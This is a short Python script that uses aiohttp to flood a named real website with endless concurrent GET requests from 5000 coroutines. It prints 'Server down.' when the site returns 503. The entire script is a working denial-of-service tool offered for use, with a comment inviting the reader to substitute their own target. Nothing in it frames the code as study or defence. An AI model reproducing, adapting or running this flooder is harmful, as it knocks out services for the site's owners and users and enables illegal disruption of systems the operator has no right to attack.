import aiohttp
import asyncio
import os
import time

TARGET_URL = "http://www.noceco.ph"  # Replace with your target URL lol

os.system('cls' if os.name == 'nt' else 'clear')

total_requests = 1000000000000000000000000000000000000000
requests_per_second = 5000 

async def attack(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                async with session.get(target_url) as response:
                    if response.status == 503:
                        print("Server down.")
                    elif response.status == 200:
                        print("Website still up.")
                    else:
                        print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(requests_per_second)])

if __name__ == "__main__":
    if not TARGET_URL:
        print("Please set the TARGET_URL variable.")
    else:
        asyncio.run(main(TARGET_URL))
